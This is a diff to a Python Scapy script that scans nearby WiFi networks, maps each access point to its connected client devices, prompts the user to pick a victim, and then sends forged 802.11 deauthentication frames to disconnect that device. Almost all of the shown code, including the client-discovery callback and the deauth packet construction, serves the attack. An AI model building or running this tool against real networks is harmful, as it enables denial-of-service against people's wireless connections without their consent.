@@ -5,7 +5,6 @@ import pandas
 import time
 import netifaces
 
-
 # global variables
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
 networks.set_index("BSSID", inplace=True)
@@ -41,9 +40,9 @@ def main():
     ######################################
 
     # get interface and change it to mode monitor
+    print()
     interface_names = netifaces.interfaces()  # get interfaces
     interfaces_length = str(len(interface_names) - 1) + ""
-    print("\npress 0 - ", interfaces_length, " to choose the WIFI interface you want to perfume attack:\n\n")
     for i in range(0, len(interface_names)):
         print(i, ":", interface_names[i])
     interface_index = input("\nchoose the WIFI interface (press 0 - " + interfaces_length + "): ")
@@ -64,6 +63,7 @@ def main():
     os.system("clear")
     print("\n\n                    searching for wifi networks - time: 1min\n")
 
+    # scanning loading screen
     global tic
     tic = time.perf_counter()
     loading_min1 = Thread(target=loading_min)
@@ -75,9 +75,11 @@ def main():
     print_all_networks()
     print_all_devices()
 
+    os.system("clear")
+    print("\n\n                   Attacking " + victim_mac + "MAC address!!\n")
     # ATTACK
-    victim_mac = victim_mac.lower()
-    network_mac = network_mac.lower()
+    victim_mac = victim_mac.lower()  # device MAC address
+    network_mac = network_mac.lower()  # access point MAC address
     dot11 = Dot11(type=0, subtype=12, addr1=victim_mac, addr2=network_mac, addr3=network_mac)
     # stack them up
     packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
@@ -96,63 +98,76 @@ def printProgressBar(iteration, total, prefix='', suffix='', decimals=1, length=
         print()
 
 
-def callback(packet):
-    if packet.haslayer(Dot11Elt) and packet.type == 0 and packet.subtype == 8:
-        if packet.addr2 not in macs.keys():
-            macs[packet.addr2] = packet.info.decode("utf-8")
-    if packet.haslayer(Dot11) and packet.getlayer(Dot11).type == 2 and not packet.haslayer(EAPOL):
-        client_mac_address = packet.addr2
-        ap_mac_address = packet.addr3
-        if ap_mac_address in macs.keys():
-            if client_mac_address not in (devices_macs.keys() or macs.keys()):
-                if client_mac_address != ap_mac_address:
-                    devices_macs[client_mac_address] = macs[ap_mac_address]
+devices = dict()
+HMAP = dict()
+
+
+def callback(pkt):
+    if pkt.haslayer(Dot11):
+        dot11_layer = pkt.getlayer(Dot11)
+        DS = pkt.FCfield & 0x3  # 3
+        to_DS = DS & 0x1 != 0  # 1
+        from_DS = DS & 0x2 != 0  # 2
+        if pkt.type == 0 and pkt.subtype == 8:
+            if dot11_layer.addr2 and (dot11_layer.addr2 not in devices):
+                HMAP[dot11_layer.addr2] = set()
+                devices[str(dot11_layer.addr2)] = str(pkt.info)
+        if to_DS == 0 and from_DS == 0:
+            if dot11_layer.addr3 in devices and (dot11_layer.addr3 != dot11_layer.addr2) and dot11_layer.addr2 not in \
+                    HMAP[dot11_layer.addr3]:
+                HMAP[dot11_layer.addr3].add(dot11_layer.addr2)
+        if to_DS == 0 and from_DS == 1:
+            if dot11_layer.addr2 in devices and (dot11_layer.addr3 != dot11_layer.addr2) and dot11_layer.addr3 not in \
+                    HMAP[dot11_layer.addr2]:
+                HMAP[dot11_layer.addr2].add(dot11_layer.addr3)
+        if to_DS == 1 and from_DS == 0:
+            if dot11_layer.addr1 in devices and (dot11_layer.addr1 != dot11_layer.addr2) and dot11_layer.addr2 not in \
+                    HMAP[dot11_layer.addr1]:
+                HMAP[dot11_layer.addr1].add(dot11_layer.addr2)
+        if to_DS == 1 and from_DS == 1:
+            if dot11_layer.addr2 in devices and (dot11_layer.addr2 != dot11_layer.addr4) and dot11_layer.addr4 not in \
+                    HMAP[dot11_layer.addr2]:
+                HMAP[dot11_layer.addr2].add(dot11_layer.addr4)
+            if dot11_layer.addr1 in devices and (dot11_layer.addr1 != dot11_layer.addr3) and dot11_layer.addr3 not in \
+                    HMAP[dot11_layer.addr1]:
+                HMAP[dot11_layer.addr1].add(dot11_layer.addr3)
 
 
 def print_all_networks():
     global network_mac
 
-    print("Which network you are willing to use: ( press 0 - ", len(macs) - 1, ")")
     k = 0
-    for network in macs:
-        print(k, "-", str(macs[network]) + "\t" + str(network))
+    for network in devices:
+        print(k, "-" + str(devices[network]) + "\t\t\t" + str(network))
         k += 1
-    net = input()
+    network_index = input("Choose Network(press 0 - " + str(k) + "): ")
     k = 0
-    for network in macs:
-        if k == int(net):
-            chosen_victim = str(macs[network])
+    for network in HMAP:
+        if k == int(network_index):
+            chosen_victim = network
             break
         k += 1
-    network_mac = chosen_victim
+    network_mac = chosen_victim  # chosen access point
 
 
 # print_all_devices function to display to the user the devices in the network
 def print_all_devices():
-    global devices_macs
+    global HMAP
+    global network_mac
     global victim_mac
     clients_count = 0
-    if len(devices_macs) == 0:
-        print("there are no devices available\n")
-        exit()
-    else:
-        os.system("clear")
-        for client in devices_macs:
-            try:
-                if devices_macs[client] == macs[victim_mac]:
-                    clients_count += 1
-                    print(client + "\n")
-            except:
-                continue
-        if clients_count == 0:
-            print("there are no devices available\n")
-            exit(0)
-        device = input("Which device you are willing to attack: ( press 0 - " + str(len(devices_macs) - 1) + ")")
-        try:
-            victim_mac = list(devices_macs)[int(device)][0]
-        except:
-            print("ERROR in wrong victim")
-        print("Attacking", victim_mac, "device")
+
+    os.system("clear")
+    for client in HMAP[network_mac]:
+        print(clients_count, "-", client)
+        clients_count = clients_count + 1
+    device_number = input("Choose device to start the attack(press 0 - " + str(clients_count) + "): ")
+    k = 0
+    for client in HMAP[network_mac]:
+        if k == int(device_number):
+            victim_mac = client
+            break
+        k += 1
 
 
 # change_channel function to go all over the wi-fi channels
